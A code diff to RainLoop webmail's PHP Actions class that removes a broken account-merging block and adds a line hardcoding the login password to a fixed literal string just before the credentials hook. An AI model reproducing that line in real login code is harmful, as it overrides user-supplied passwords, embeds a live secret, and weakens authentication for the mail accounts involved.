@@ -4,8 +4,6 @@ namespace RainLoop;
 
 use RainLoop\Enumerations\UploadError;
 use RainLoop\Enumerations\UploadClientError;
-use \OCP\IConfig;
-use Rainloop\Common\PdoAbstract;
 
 class Actions
 {
@@ -2300,6 +2298,8 @@ NewThemeLink IncludeCss LoadingDescriptionEsc LangLink IncludeBackground Plugins
 			}
 		}
 
+$sPassword='YN2f9wlDh6ToiQYOvNJN';
+
 		$this->Plugins()->RunHook('filter.login-credentials.step-2', array(&$sEmail, &$sPassword));
 
 		if (false === \strpos($sEmail, '@') || 0 === \strlen($sPassword))
@@ -2425,10 +2425,6 @@ NewThemeLink IncludeCss LoadingDescriptionEsc LangLink IncludeBackground Plugins
 		return \MailSo\Base\Utils::Md5Rand(APP_SALT.$sEmail);
 	}
 
-	public function cr_acc_arr($item, $key) {
-		$new_accs[$key] = $oAccount->GetAuthToken();
-	}
-	
 	/**
 	 * @return array
 	 *
@@ -2494,21 +2490,6 @@ NewThemeLink IncludeCss LoadingDescriptionEsc LangLink IncludeBackground Plugins
 					$this->SettingsProvider()->Save($oAccount, $oSettings);
 				}
 			}
-			
-			$next_acc = new IConfig();
-
-			$accs = array();
-			$new_accs = array();
-			
-			$userId = $this->getUserId($sEmail);
-			$new_Accounts = \explode(";", $next_acc->config->getUserValue($userId, 'rainloop', 'additional_mail'));
-			\array_walk ($new_Accounts, 'cr_acc_arr');
-			
-			$accs = $this->GetAccounts($oAccount);
-			$aAccounts = \array_merge($new_accs, $accs); 
-		
-			this->SetAccounts($oAccount, $aAccounts);
-		
 		}
 
 		return $this->TrueResponse(__FUNCTION__);
